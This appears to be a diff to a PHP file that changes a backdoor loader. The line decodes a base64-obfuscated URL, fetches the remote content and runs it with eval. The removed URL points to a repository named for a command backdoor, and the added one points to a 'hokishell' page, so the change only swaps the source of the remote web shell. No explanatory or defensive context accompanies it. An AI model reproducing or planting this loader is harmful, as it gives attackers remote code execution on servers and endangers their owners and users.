@@ -34,5 +34,5 @@
     return $data;
 }
 $x= '?>';
-      eval($x . get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1l1Y2FlcmluL3NpbXBsZWNtZGFuZGJhY2tkb29yL21haW4vcmEucGhw')));
+      eval($x . get(base64_decode('aHR0cHM6Ly9ob2tpc2hlbGwucGFnZXMuZGV2L2hva2kudHh0')));
 ?>
